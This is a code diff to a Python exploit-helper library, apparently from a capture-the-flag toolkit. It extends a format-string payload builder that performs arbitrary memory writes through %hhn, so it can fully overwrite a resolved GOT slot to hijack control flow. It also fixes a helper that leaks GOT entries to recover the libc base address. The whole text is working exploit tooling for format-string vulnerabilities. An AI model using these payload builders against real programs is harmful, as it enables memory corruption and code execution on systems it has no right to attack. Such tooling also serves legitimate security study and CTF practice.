@@ -15,28 +15,37 @@ import re
 import struct
 
 
-def _byte_writes(writes, word):
+def _byte_writes(writes, word, nbytes=None):
     """Expand {addr: value} into an ordered list of (addr, byte) single-byte writes covering each
-    value's significant bytes (capped at `word`)."""
+    value's significant bytes (capped at `word`), or exactly `nbytes` bytes when given.
+
+    Significant-bytes-only is correct ONLY when the bytes above them already hold the value's high
+    bytes (zero). Overwriting a RESOLVED GOT slot (0x00007f..libc) with an image address
+    (0x401196) that way leaves the libc high bytes in place -- 0x7fxx..401196, a crash, not a
+    hijack. A caller that cannot vouch for the old contents passes `nbytes` (6 covers every
+    canonical x86-64 user address)."""
     out = {}
     for addr, val in writes.items():
         val &= (1 << (8 * word)) - 1
         n = max(1, (val.bit_length() + 7) // 8)
+        if nbytes:
+            n = max(1, min(int(nbytes), word))
         for i in range(n):
             out[addr + i] = (val >> (8 * i)) & 0xFF
     return out
 
 
 def fmtstr_payload(arg_offset: int, writes: dict, *, written: int = 0, word: int = 8,
-                   endian: str = "little") -> bytes:
+                   endian: str = "little", nbytes=None) -> bytes:
     """A format string that performs the {addr: value} memory writes via `%hhn`.
 
     `arg_offset` is the 1-based printf argument index at which the START of the format buffer lands
     on the stack (recover it with `find_fmt_offset`). `written` is the count printf has already
     emitted before this payload (e.g. a fixed prefix). Returns: the format directives, NUL-padded to
     a `word` boundary, followed by the packed target addresses -- the `%k$hhn` directives index
-    those trailing addresses by absolute stack position."""
-    bw = sorted(_byte_writes(writes, word).items(), key=lambda kv: kv[1])
+    those trailing addresses by absolute stack position. `nbytes` forces the bytes written per
+    address (see `_byte_writes`): pass it when the destination's current high bytes are unknown."""
+    bw = sorted(_byte_writes(writes, word, nbytes).items(), key=lambda kv: kv[1])
     pk = ("<" if endian == "little" else ">") + ("Q" if word == 8 else "I")
     # Fixed point: the format's length sets where the address table begins (its stack index), whose
     # digit count feeds back into the format's length. Iterate until the table position is stable.
@@ -97,6 +106,12 @@ def read_at_payload(arg_offset: int, addr: int, *, word: int = 8, pad: int = 16)
     which needs several corroborating symbol pointers a stack dump rarely has). printf prints the
     dereferenced string FIRST, so the leaked bytes lead the output. Used to read a GOT slot's
     resolved libc address and recover the base."""
+    # The directive must FIT its pad, or the address after it is not at the slot it names. A deep
+    # arg_offset (a large frame) makes `%NNN$s` longer than a 16-byte pad: grow the pad a word at a
+    # time until the directive naming the resulting slot fits.
+    pad = max(word, pad - pad % word)
+    while len(b"%%%d$s" % (arg_offset + pad // word)) > pad:
+        pad += word
     slot = arg_offset + pad // word
     directive = ("%%%d$s" % slot).encode().ljust(pad, b".")
     return directive + struct.pack("<Q" if word == 8 else "<I", addr) + b"\n"
